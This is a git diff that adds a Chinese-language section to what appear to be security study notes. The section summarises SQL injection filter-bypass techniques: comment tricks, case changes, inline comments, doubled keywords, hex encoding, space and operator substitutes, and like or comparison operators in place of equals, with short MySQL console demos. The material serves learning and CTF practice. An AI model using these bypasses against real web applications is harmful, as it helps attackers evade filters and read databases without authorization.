@@ -197,5 +197,100 @@ infomation_schema， msyql， performance_scheme, test
 
 ## mysql的用户名密码是放在哪张表里面？mysql数据库下的user表。
 
+## sql注入过滤绕过总结  
+### 注释符号绕过：
+常用的注释符有  
+```php 
+-- 注释内容
+# 注释内容
+/*注释内容*/
+```
+### 大小写绕过：  
+常用于waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。  
+例如：waf过滤了关键字select，可以尝试使用Select等绕过。  
+```php
+mysql> select * from users where id = -1 union select 1,2,3
+    -> ;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+1 row in set (0.00 sec)
 
+#大小写绕过
+mysql> select * from users where id = -1 union Select 1,2,3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
 
+--------------------- 
+```
+### 内联注释绕过:  
+内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。
+```php 
+mysql> select * from users where id = -1 union /*!select*/ 1,2,3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+--------------------- 
+```
+### 双写关键字绕过:  
+在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。  
+### 特殊编码绕过:    
+十六进制绕过  
+```php
+mysql> select * from users where username = 0x7465737431;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+```
+ascii编码绕过  
+Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)  
+tip:好像新版mysql不能用了
+### 空格过滤绕过:  
+一般绕过空格过滤的方法有以下几种方法来取代空格  
+```php
+/**/
+()
+回车(url编码中的%0a)
+`(tap键上面的按钮)
+tap
+两个空格
+```
+实例:  
+```php
+mysql> select/**/*/**/from/**/users; 
+
+mysql> select(id)from(users); #注意括号中不能含有*  
+
+mysql> select
+    -> *
+    -> from 
+    -> users
+    -> where 
+    -> id = 1;
+
+mysql> select`id`from`users`where`id`=1;  
+``` 
+### 过滤or and xor not 绕过:  
+>and = &&  
+or = ||  
+xor = | # 异或  
+not = !  
+### 过滤等号=绕过  
+#####不加通配符的like执行的效果和=一致，所以可以用来绕过。  
+正常加上通配符的like：  
+```php
+mysql> select * from users where username like "test%";
+```
+#####使用大小于号来绕过：  
+```php
+mysql> select * from users where id > 1 and id < 3;
+```
